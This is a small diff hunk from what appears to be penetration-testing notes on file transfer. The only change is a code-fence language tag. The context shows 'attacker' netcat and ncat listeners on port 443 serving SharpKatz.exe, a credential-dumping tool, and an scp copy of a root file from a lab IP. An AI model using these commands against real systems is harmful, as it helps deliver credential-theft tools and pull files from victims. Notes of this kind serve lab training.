@@ -65,7 +65,7 @@ scp plaintext@192.168.49.128:/root/myroot.txt .
 
 ## 4) nc tools
 - **attacker**
-```
+```bash
 ## attacker lestin
 sudo nc -l -p 443 -q 0 < SharpKatz.exe
 sudo ncat -l -p 443 --send-only < SharpKatz.exe
